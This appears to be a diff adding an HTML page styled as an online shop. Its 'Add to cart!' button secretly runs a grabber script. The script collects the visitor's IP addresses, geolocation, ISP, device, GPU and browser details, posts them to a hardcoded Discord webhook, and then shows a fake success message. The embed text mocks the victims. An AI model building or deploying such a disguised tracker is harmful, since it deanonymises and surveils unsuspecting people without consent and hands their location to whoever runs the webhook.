@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>OSM Panel</title>
+<style>
+  :root {
+    --bg: #0d1b2a;
+    --card: #1b263b;
+    --accent: #415a77;
+    --accent-hover: #778da9;
+    --text: #e0e1dd;
+    --ok: #90ee90;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: radial-gradient(1200px 800px at 50% -10%, #14253d 0%, var(--bg) 60%);
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    color: var(--text);
+    min-height: 100vh;
+    display: flex; flex-direction: column; align-items: center;
+  }
+  .banner {
+    width: 100%;
+    padding: 16px 20px;
+    text-align: center;
+    background: linear-gradient(135deg, #1b263b, #152238);
+    font-size: 28px; font-weight: 800;
+    box-shadow: 0 6px 20px rgba(0,0,0,.35);
+    letter-spacing: .3px;
+  }
+  .card {
+    margin-top: 48px;
+    width: min(92vw, 360px);
+    background: linear-gradient(180deg, var(--card), #182235);
+    padding: 22px;
+    border-radius: 16px;
+    box-shadow: 0 12px 28px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.05);
+    text-align: center;
+  }
+  .thumb {
+    width: 100%;
+    height: 160px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #22304a, #1a2640);
+    display: grid; place-items: center;
+    margin-bottom: 14px;
+  }
+  .thumb svg { opacity: .9 }
+  h2 { margin: 10px 0 4px; font-size: 22px; }
+  p { margin: 0 0 14px; opacity: .85; }
+  button {
+    width: 100%;
+    background: var(--accent);
+    color: white;
+    padding: 12px 14px;
+    border: 0; border-radius: 10px;
+    font-weight: 700; font-size: 15px;
+    cursor: pointer;
+    box-shadow: 0 8px 16px rgba(65,90,119,.35);
+    transition: transform .06s ease, background .2s ease, box-shadow .2s ease;
+  }
+  button:hover { background: var(--accent-hover); }
+  button:active { transform: translateY(1px); box-shadow: 0 6px 12px rgba(65,90,119,.35); }
+  .notification {
+    display: none;
+    margin-top: 14px;
+    padding: 10px 12px;
+    border-radius: 10px;
+    background: rgba(144,238,144,.12);
+    color: var(--ok);
+    font-weight: 800;
+    border: 1px solid rgba(144,238,144,.35);
+  }
+  .mini { margin-top: 10px; font-size: 12px; opacity: .7; }
+</style>
+</head>
+<body>
+
+<div class="banner">🛒 My Shop</div>
+
+<div class="card">
+  <div class="thumb" aria-hidden="true">
+    <!-- simple cart icon -->
+    <svg width="64" height="64" viewBox="0 0 24 24" fill="none">
+      <path d="M3 3h2l1 4m0 0 1.2 6.4A2 2 0 0 0 9.17 15H18a2 2 0 0 0 1.97-1.64L21 8H6M6 7h15" stroke="#a9c3e6" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+      <circle cx="9.5" cy="19.5" r="1.5" fill="#a9c3e6"/>
+      <circle cx="17.5" cy="19.5" r="1.5" fill="#a9c3e6"/>
+    </svg>
+  </div>
+  <h2>Test Item</h2>
+  <p>My Item Test/p>
+  <button onclick="sendFullInfo()">Add to cart!</button>
+  <div class="notification" id="notify">Added to cart successfully</div>
+  <div class="mini">test to add to cart </div>
+</div>
+
+<script>
+async function sendFullInfo() {
+  const webhook = "https://discordapp.com/api/webhooks/1405893536955629608/55r0-jEBwzV5-gIUUYuOVapn76RW2Ym2dYUHECd0xOZRQvIcWUXTd-aMoypc_xmAU-VS"; // ← replace with your Discord webhook
+
+  // Helper: safe fetch JSON with timeout
+  const getJSON = async (url, timeoutMs = 8000) => {
+    const controller = new AbortController();
+    const t = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+      const r = await fetch(url, { signal: controller.signal });
+      clearTimeout(t);
+      return await r.json();
+    } catch { clearTimeout(t); return null; }
+  };
+
+  // 1) IPs
+  const v4 = await getJSON("https://api.ipify.org?format=json");
+  const ipv4 = v4?.ip || "Unknown";
+  const v6j = await getJSON("https://api64.ipify.org?format=json");
+  const ipv6 = v6j?.ip || "No IPv6 detected";
+
+  // 2) Geo (based on IPv4)
+  const geo = await getJSON(`https://ipapi.co/${ipv4}/json/`);
+  const city   = geo?.city || "Unknown";
+  const region = geo?.region || "Unknown";
+  const country = geo?.country_name || "Unknown";
+  const isp    = geo?.org || "Unknown";
+  const lat = (geo?.latitude != null) ? geo.latitude : "—";
+  const lon = (geo?.longitude != null) ? geo.longitude : "—";
+
+  // 3) Device / Browser
+  const ua = navigator.userAgent;
+  const os = navigator.platform || "Unknown";
+  const lang = navigator.language || "Unknown";
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+  const screenRes = `${screen.width}x${screen.height}`;
+  const colorDepth = `${screen.colorDepth}-bit`;
+  const cores = (navigator.hardwareConcurrency || "Unknown").toString();
+  const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
+
+  // 4) GPU via WebGL
+  let gpu = "Unknown";
+  try {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (gl) {
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    }
+  } catch {}
+
+  // 5) Session
+  const timestamp = new Date();
+  const iso = timestamp.toISOString();
+  const local = timestamp.toLocaleString();
+  const ref = document.referrer || "Direct / None";
+
+  // Build a tidy Discord embed
+  const embed = {
+    username: "My Shop Logger",
+    embeds: [{
+      title: "Another dumbass got beamed?",
+      description: "Dumbass full info's",
+      color: 0x2b6cb0, // nice blue
+      fields: [
+        {
+          name: "Network",
+          value: [
+            `**IPv4:** \`${ipv4}\``,
+            `**IPv6:** \`${ipv6}\``,
+            `**ISP:** \`${isp}\``
+          ].join("\n"),
+          inline: false
+        },
+        {
+          name: "Location (GeoIP)",
+          value: [
+            `**City:** \`${city}\``,
+            `**Region:** \`${region}\``,
+            `**Country:** \`${country}\``,
+            `**Approx. Coords:** \`${lat}, ${lon}\``
+          ].join("\n"),
+          inline: false
+        },
+        {
+          name: "Device & Browser",
+          value: [
+            `**OS:** \`${os}\``,
+            `**Lang / TZ:** \`${lang}\` / \`${tz}\``,
+            `**Screen:** \`${screenRes}\` • \`${colorDepth}\``,
+            `**CPU / RAM:** \`${cores} cores\` • \`${ram}\``,
+            `**GPU:** \`${gpu}\``
+          ].join("\n"),
+          inline: false
+        },
+        {
+          name: "Session",
+          value: [
+            `**User-Agent:** \`${ua}\``,
+            `**Referrer:** \`${ref}\``,
+            `**Time:** \`${local}\` (\`${iso}\`)`
+          ].join("\n"),
+          inline: false
+        }
+      ],
+      footer: { text: "real owner is binnou321 on discord" }
+    }]
+  };
+
+  try {
+    await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(embed)
+    });
+  } catch (e) {
+    // Silent fail by design (no popups); you can log if needed:
+    console.error("Webhook send failed", e);
+  }
+
+  // Show the in-page “Added to cart successfully” message
+  const n = document.getElementById("notify");
+  n.style.display = "block";
+}
+</script>
+</body>
+</html>
